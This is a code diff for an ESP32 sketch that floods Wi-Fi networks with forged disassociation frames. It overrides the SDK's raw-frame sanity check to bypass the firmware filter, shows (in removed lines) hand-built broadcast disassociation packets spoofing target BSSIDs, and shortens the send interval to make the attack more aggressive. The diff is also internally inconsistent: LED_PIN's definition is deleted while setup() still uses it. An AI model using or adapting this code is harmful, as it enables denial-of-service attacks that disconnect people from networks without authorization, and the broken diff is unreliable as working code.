@@ -1,15 +1,9 @@
 #include <WiFi.h>
 #include <esp_wifi.h>
-
-extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
-  return 0; // bypass SDK filter
-}
+#include <deauth.h>
 
 #define MAX_TARGETS 20
-#define DISASSOC_REASON 0x08 // Inactivity (can change to 0x01, 0x07, etc.)
-#define DISASSOC_COUNT 20
-#define LOOP_DELAY 5000
-#define LED_PIN 2 // onboard blue LED
+#define LOOP_DELAY 200
 
 struct Target {
   uint8_t bssid[6];
@@ -20,28 +14,13 @@ struct Target {
 Target targets[MAX_TARGETS];
 int targetCount = 0;
 
-void sendDisassoc(uint8_t *bssid) {
-  uint8_t packet[26] = {
-    0xA0, 0x00,
-    0x3A, 0x01,
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
-    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
-    0x00, 0x00,
-    DISASSOC_REASON, 0x00
-  };
-
-  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
-
-  // Blink onboard LED
-  digitalWrite(LED_PIN, HIGH);
-  delay(5);
-  digitalWrite(LED_PIN, LOW);
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
+  return 0; // bypass SDK filter
 }
 
 void setup() {
   pinMode(LED_PIN, OUTPUT);
-  digitalWrite(LED_PIN, LOW); // start off
+  digitalWrite(LED_PIN, LOW);
   Serial.begin(115200);
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();
